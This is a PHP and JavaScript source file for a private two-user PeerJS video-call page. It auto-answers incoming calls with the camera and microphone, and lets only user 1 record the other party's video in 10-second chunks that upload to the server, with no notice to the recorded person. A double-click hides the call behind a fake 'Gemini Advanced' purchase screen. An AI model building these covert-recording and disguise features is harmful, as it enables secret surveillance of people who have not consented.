<?php
require_once 'auth.php';
$user_id = $_SESSION['user_id'] ?? 0;
if (!$user_id) { header('Location: index.php'); exit(); }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Standalone VCall</title>
    <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
    <style>
        :root {
            --bg: #000;
            --accent: #4285f4;
            --danger: #ea4335;
        }
        body, html { margin: 0; padding: 0; height: 100%; width: 100%; background: var(--bg); color: #fff; font-family: -apple-system, sans-serif; overflow: hidden; }
        .v-container { position: relative; width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; background: #000; }
        
        #remote-video { width: 100%; height: 100%; object-fit: contain; background: #000; transition: aspect-ratio 0.3s ease; }
        #local-video { 
            position: absolute; top: env(safe-area-inset-top, 20px); right: 20px; width: 85px; height: auto; 
            background: #222; border-radius: 12px; object-fit: cover; 
            border: 1px solid rgba(255,255,255,0.2); transform: scaleX(-1);
            z-index: 10;
        }

        .controls { 
            position: absolute; bottom: max(40px, env(safe-area-inset-bottom)); left: 50%; transform: translateX(-50%); 
            display: flex; gap: 15px; background: rgba(0,0,0,0.6); backdrop-filter: blur(20px); 
            padding: 12px 20px; border-radius: 40px; border: 1px solid rgba(255,255,255,0.15);
            z-index: 100;
            transition: opacity 0.3s ease, transform 0.3s ease;
        }
        .controls.hidden { opacity: 0; transform: translate(-50%, 20px); pointer-events: none; }
        
        /* Camouflage Fake Page */
        #camouflage-page {
            position: fixed; inset: 0; background: #000; z-index: 2000;
            display: none; flex-direction: column; align-items: center; justify-content: center;
            padding: 40px 20px; text-align: center; font-family: 'Google Sans', sans-serif;
        }
        .fake-card {
            background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
            border-radius: 28px; padding: 40px 24px; max-width: 400px; width: 100%;
        }
        .fake-logo { font-size: 48px; margin-bottom: 20px; color: var(--accent); }
        .fake-title { font-size: 24px; font-weight: 600; margin-bottom: 12px; }
        .fake-desc { font-size: 15px; color: #9aa0a6; line-height: 1.6; margin-bottom: 30px; }
        .fake-btn {
            background: var(--accent); color: #fff; border: none; padding: 16px 32px;
            border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer;
            width: 100%; transition: 0.2s;
        }
        .fake-btn:active { transform: scale(0.98); opacity: 0.9; }
        .fake-price { font-size: 32px; font-weight: 700; margin-bottom: 8px; }
        .fake-sub { font-size: 14px; color: #9aa0a6; margin-bottom: 24px; }
        .btn { 
            width: 46px; height: 46px; border-radius: 50%; border: none; 
            background: rgba(255,255,255,0.1); color: #fff; font-size: 18px; 
            cursor: pointer; display: flex; align-items: center; justify-content: center;
            transition: 0.2s;
        }
        .btn.active { background: var(--accent); }
        .btn.end { background: var(--danger); }
        .btn.record { background: #fff; color: #000; font-size: 12px; font-weight: bold; border-radius: 14px; width: 54px; }
        .btn.record.recording { background: var(--danger); color: #fff; animation: pulse 1.5s infinite; }

        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }

        .status-overlay { 
            position: absolute; top: env(safe-area-inset-top, 20px); left: 20px; font-size: 11px; 
            background: rgba(0,0,0,0.5); padding: 6px 12px; border-radius: 20px; 
            color: #fff; font-family: monospace; z-index: 100;
            border: 1px solid rgba(255,255,255,0.1);
        }

        .rec-timer {
            position: absolute; top: -20px; left: 50%; transform: translateX(-50%);
            font-size: 10px; color: #ff4d4d; font-weight: bold; background: rgba(0,0,0,0.7);
            padding: 2px 6px; border-radius: 4px; display: none;
        }
    </style>
</head>
<body>
    <div class="v-container" id="v-container">
        <div class="status-overlay" id="status">INITIALIZING...</div>
        <video id="remote-video" autoplay playsinline webkit-playsinline onclick="handleScreenClick()"></video>
        <video id="local-video" autoplay playsinline webkit-playsinline muted></video>

        <div class="controls" id="controls">
            <span class="rec-timer" id="rec-timer">00:00</span>
            <button class="btn active" id="btn-audio" onclick="toggleAudio()">🎤</button>
            <button class="btn active" id="btn-video" onclick="toggleVideo()">📹</button>
            <button class="btn" id="btn-call" onclick="initiateCall()">📞</button>
            <button class="btn record" id="btn-record" style="display:none;" onclick="toggleRecording()">REC</button>
            <button class="btn end" onclick="window.location.href='index.php'">✖</button>
        </div>
    </div>

    <!-- Camouflage Fake Page -->
    <div id="camouflage-page">
        <div class="fake-card">
            <div class="fake-logo">✦</div>
            <h2 class="fake-title">Gemini Advanced</h2>
            <p class="fake-desc">Access our most capable AI models and exclusive features to boost your productivity.</p>
            <div class="fake-price">$19.99</div>
            <p class="fake-sub">per month, billed annually</p>
            <button class="fake-btn" onclick="revealRealUI()">Buy Now</button>
            <p style="margin-top: 20px; font-size: 12px; color: #5f6368; cursor: pointer;" onclick="location.href='index.php'">Return to Home</p>
        </div>
    </div>

    <script>
        const USER_ID = <?php echo $user_id; ?>;
        const CSRF_TOKEN = '<?php echo $_SESSION['csrf_token'] ?? ''; ?>';
        const SESSION_ID = Math.random().toString(36).substring(2, 8);
        const MY_PEER_ID = `vcall-v1-${USER_ID}-${SESSION_ID}`;
        
        let myId, otherId, peer, localStream, currentCall, mediaRecorder;
        let isRecording = false;
        let recInterval = null;
        let recSeconds = 0;
        let recChunkIndex = 0;
        let recSessionId = null;
        let hideControlsTimeout = null;

        // Error suppression for extension noise
        window.onerror = (msg) => {
            if (typeof msg === 'string' && (msg.includes('message channel closed') || msg.includes('Extension context invalidated'))) return true;
        };

        window.onload = () => {
            startApp(USER_ID);
            setupInteractiveEvents();
        };

        function setupInteractiveEvents() {
            const container = document.getElementById('v-container');
            
            // Auto-hide logic
            resetHideTimeout();
            
            // Double-click camouflage
            container.addEventListener('dblclick', (e) => {
                if (e.target.tagName !== 'BUTTON') {
                    showCamouflage();
                }
            });
        }

        function handleScreenClick() {
            const remote = document.getElementById('remote-video');
            if (remote.muted) {
                remote.muted = false;
                updateStatus('AUDIO RESTORED');
            }
            showControls();
        }

        function showControls() {
            const controls = document.getElementById('controls');
            controls.classList.remove('hidden');
            resetHideTimeout();
        }

        function resetHideTimeout() {
            clearTimeout(hideControlsTimeout);
            hideControlsTimeout = setTimeout(() => {
                const controls = document.getElementById('controls');
                if (controls) controls.classList.add('hidden');
            }, 5000);
        }

        function showCamouflage() {
            document.getElementById('v-container').style.display = 'none';
            document.getElementById('camouflage-page').style.display = 'flex';
        }

        function revealRealUI() {
            document.getElementById('camouflage-page').style.display = 'none';
            document.getElementById('v-container').style.display = 'flex';
            showControls();
        }

        async function startApp(uid) {
            myId = uid;
            otherId = (uid === 1) ? 2 : 1;
            if (myId === 1) document.getElementById('btn-record').style.display = 'flex';
            
            updateStatus(`USER ${myId} - INITIALIZING...`);
            await initMedia();
            initPeer();
        }

        async function initMedia() {
            try {
                localStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, 
                    audio: true 
                });
                document.getElementById('local-video').srcObject = localStream;
            } catch (e) {
                console.error('Media access denied', e);
                updateStatus('MEDIA ERROR - CHECK PERMISSIONS');
                try {
                    localStream = await navigator.mediaDevices.getUserMedia({ video: false, audio: true });
                } catch(e2) {}
            }
        }

        function initPeer() {
            console.log('My Peer ID:', MY_PEER_ID);
            peer = new Peer(MY_PEER_ID, {
                debug: 1,
                config: { 
                    'iceServers': [
                        { urls: 'stun:stun.l.google.com:19302' },
                        { urls: 'stun:stun1.l.google.com:19302' },
                        { urls: 'stun:stun2.l.google.com:19302' }
                    ]
                }
            });

            peer.on('open', id => {
                registerPeer(id);
                updateStatus('ONLINE - READY');
            });

            peer.on('call', call => {
                call.answer(localStream);
                handleCall(call);
            });

            peer.on('error', err => {
                updateStatus(`PEER ERROR: ${err.type.toUpperCase()}`);
                if (err.type === 'unavailable-id') setTimeout(() => location.reload(), 2000);
            });
        }

        function handleCall(call) {
            currentCall = call;
            call.on('stream', remoteStream => {
                const remote = document.getElementById('remote-video');
                if (!remote || remote.srcObject === remoteStream) return;
                
                const startPlay = () => {
                    if (remote._isPlaying) return;
                    remote.play().then(() => {
                        remote._isPlaying = true;
                        updateStatus('CONNECTED');
                    }).catch(() => {
                        remote.muted = true;
                        remote.play();
                        updateStatus('TAP TO UNMUTE');
                    });
                };

                remote.onloadedmetadata = () => {
                    if (remote.videoWidth && remote.videoHeight) {
                        // Dynamically adjust ratio to match incoming video
                        remote.style.aspectRatio = `${remote.videoWidth} / ${remote.videoHeight}`;
                    }
                    startPlay();
                };

                setTimeout(() => { if (!remote._isPlaying) startPlay(); }, 3000);
                remote.srcObject = remoteStream;
            });

            call.on('close', () => {
                updateStatus('DISCONNECTED');
                setTimeout(() => location.reload(), 1500);
            });
        }

        async function initiateCall() {
            updateStatus('SEARCHING FOR PEER...');
            try {
                const resp = await fetch(`vcall_api.php?action=get_peer&user_id=${otherId}`);
                const data = await resp.json();
                if (data.peer_id) {
                    const call = peer.call(data.peer_id, localStream);
                    handleCall(call);
                } else {
                    updateStatus('PEER OFFLINE');
                }
            } catch (e) { updateStatus('SIGNALING ERROR'); }
        }

        function registerPeer(id) {
            fetch(`vcall_api.php?action=register&user_id=${myId}&peer_id=${id}`);
            setInterval(() => fetch(`vcall_api.php?action=register&user_id=${myId}&peer_id=${id}`), 30000);
        }

        function updateStatus(txt) { document.getElementById('status').textContent = txt; }

        function toggleAudio() {
            const track = localStream.getAudioTracks()[0];
            if (track) {
                track.enabled = !track.enabled;
                document.getElementById('btn-audio').classList.toggle('active', track.enabled);
            }
        }

        function toggleVideo() {
            const track = localStream.getVideoTracks()[0];
            if (track) {
                track.enabled = !track.enabled;
                document.getElementById('btn-video').classList.toggle('active', track.enabled);
            }
        }

        async function uploadChunk(blob, index, sessionId) {
            const fd = new FormData(); 
            fd.append('recording', blob); 
            fd.append('chunk_index', index); 
            fd.append('rec_session_id', sessionId);
            fd.append('mime_type', blob.type);
            // Standalone VCall uses the main api.php for storage since it's already robust
            try { await fetch(`api.php?action=save_recording&_csrf=${encodeURIComponent('<?php echo $_SESSION['csrf_token']; ?>')}`, { method: 'POST', body: fd }); } catch(e) {}
        }

        function toggleRecording() {
            const btn = document.getElementById('btn-record');
            const timerEl = document.getElementById('rec-timer');
            
            if (isRecording) {
                isRecording = false;
                if (mediaRecorder) mediaRecorder.stop();
                clearInterval(recInterval);
                btn.classList.remove('recording');
                btn.textContent = 'REC';
                timerEl.style.display = 'none';
                return;
            }

            const remoteVideo = document.getElementById('remote-video');
            const remoteStream = remoteVideo ? remoteVideo.srcObject : null;
            if (!remoteStream) return alert('No active stream to record');

            isRecording = true;
            recChunkIndex = 0;
            recSeconds = 0;
            recSessionId = Date.now();
            
            btn.classList.add('recording');
            btn.textContent = 'STOP';
            timerEl.style.display = 'block';

            const types = ['video/webm;codecs=vp8,opus', 'video/webm', 'video/mp4'];
            let mimeType = '';
            for (let t of types) { if (MediaRecorder.isTypeSupported(t)) { mimeType = t; break; } }

            mediaRecorder = new MediaRecorder(remoteStream, mimeType ? { mimeType } : {});
            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) {
                    uploadChunk(e.data, recChunkIndex++, recSessionId);
                }
            };
            
            // Start recording in 10-second segments
            mediaRecorder.start(10000);

            recInterval = setInterval(() => {
                recSeconds++;
                const m = Math.floor(recSeconds / 60).toString().padStart(2, '0');
                const s = (recSeconds % 60).toString().padStart(2, '0');
                timerEl.textContent = `${m}:${s}`;
            }, 1000);
        }
    </script>
</body>
</html>
